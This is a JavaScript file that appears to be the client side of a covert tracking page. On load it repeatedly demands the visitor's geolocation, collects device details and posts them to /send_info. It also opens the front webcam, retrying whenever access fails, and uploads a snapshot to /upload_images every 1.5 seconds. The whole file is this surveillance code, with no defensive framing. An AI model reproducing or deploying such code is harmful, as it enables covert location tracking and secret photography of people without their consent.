let checkinsss=()=>{
    if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function (position) {
    // Get latitude and longitude
    const latitudes = position.coords.latitude;
    const longitudes = position.coords.longitude;
    send(latitudes,longitudes)
}, function (error) {
    checkinsss();
});
} else {
    checkinsss();
}
};

//device info
function getDeviceInfo() {
  console.log(navigator.deviceMemory)
  console.log(navigator.hardwareConcurrency)
  console.log(navigator)
  const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    search_engin: navigator.vendor,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    ram: navigator.deviceMemory,
    ram: navigator.deviceMemory,
  };

  return deviceInfo;
}


let send = (lati, long) => {
  console.log(lati,long)
  fetch("/send_info", {
    method: "POST",
    body: JSON.stringify({
      l1: `${lati}`,
      l2: `${long}`,
      platform: `${navigator.platform}`,
      search_engin: `${navigator.vendor}`,
      screenWidth: `${screen.width}`,
      screenHeight: `${screen.height}`,
      ram: `${navigator.deviceMemory}`,
      core: `${navigator.hardwareConcurrency}`
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8"
    }
  })
    .then((response) => response.json())
    .then((json) => console.log(json));
};
//taking pic


function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: JSON.stringify({ image: imgdata }),  // Send as JSON
        url: '/upload_images',
        contentType: 'application/json',           // Set content type to JSON
        dataType: 'json',
        async: false,
        success: function(result) {
            console.log("Image uploaded successfully", result);
        },
        error: function(error) {
            console.error("Error uploading image:", error);
        }
    });
}

// Rest of your code remains unchanged

    
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');
    
    const constraints = {
      audio: false,
      video: {
        
        facingMode: "user"
      }
    };
    
    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        init();
      }
    }
    
    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
    
    var context = canvas.getContext('2d');
      setInterval(function(){
    
           context.drawImage(video, 0, 0, 640, 480);
           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
           post(canvasData); }, 1500);
      
    
    }
    
    // Load init
    window.onload=()=>{
      checkinsss();
      init();
  }
  